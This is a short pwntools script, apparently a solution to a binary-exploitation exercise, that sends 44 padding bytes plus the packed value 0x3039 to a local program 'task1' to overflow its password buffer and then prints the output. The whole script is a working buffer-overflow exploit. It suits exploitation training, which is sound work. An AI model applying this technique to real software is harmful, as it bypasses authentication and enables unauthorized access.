from pwn import *


io = process("./task1")
io.recvuntil("Enter password:")
password = b'A' * 44 + p32(0x3039)
io.sendline(password)

while True:
	try:
		# use "readline" from pwntools
		line = io.recvline().decode('ascii')
		print(line)
	except:
		# could not read line => program exited
		break
io.kill()

# io.interactive()